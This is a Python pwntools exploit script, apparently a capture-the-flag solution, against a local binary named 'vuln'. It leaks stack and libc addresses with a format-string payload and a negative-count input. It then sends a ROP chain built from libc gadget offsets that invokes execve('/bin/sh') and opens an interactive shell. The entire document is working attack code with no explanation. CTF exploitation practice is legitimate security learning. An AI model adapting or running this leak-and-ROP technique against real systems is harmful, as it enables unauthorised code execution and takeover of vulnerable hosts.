from pwn import *

r=process("./vuln")
pause()
context.log_level='debug'
r.recvuntil(b"you have n chance to getshell\n n = ")
r.sendline(b"1")
pay="%p\n"
r.recvuntil(b"type something:")
r.send(pay)
r.recvuntil("you type: ")
stack_add=int(r.recvuntil(b"you")[:-3],16)
print(hex(stack_add))
r.recvuntil(b"n = ")
r.sendline(b"-1")
#r.sendline(b"-1")
printf_add=0x4012CF

pay=b'aaaaa'+p64(stack_add+0x2130)+p64(printf_add)+b"%3$p"+b"\x00\x00\xff\xff"+p64(0)+p64(0)
#
r.sendline(pay)
r.recvuntil(b"type something:")
libc_base=int(r.recvuntil(b"you")[:-3],16)-0x1147E2
print(hex(libc_base))
r.recvuntil(b"n = ")
r.sendline(b"-1")
libc=ELF("./libc.so.6")
sys_add=libc.sym["system"]+libc_base
binsh_add=next(libc.search(b"/bin/sh"))+libc_base
rdi_add=0x2a3e5+libc_base
rsi_add=0x2be51+libc_base
rdxr12_add=0x11f2e7+libc_base
rax_add=0x045eb0+libc_base
syscall_add=0x91316+libc_base
pay2=b'a'+p64(stack_add+0x2130)+p64(rdi_add)+p64(binsh_add)+p64(rsi_add)+p64(0)+p64(rdxr12_add)+p64(0)*2+p64(rax_add)+p64(0x3b)+p64(syscall_add)
r.sendline(pay2)
r.interactive()
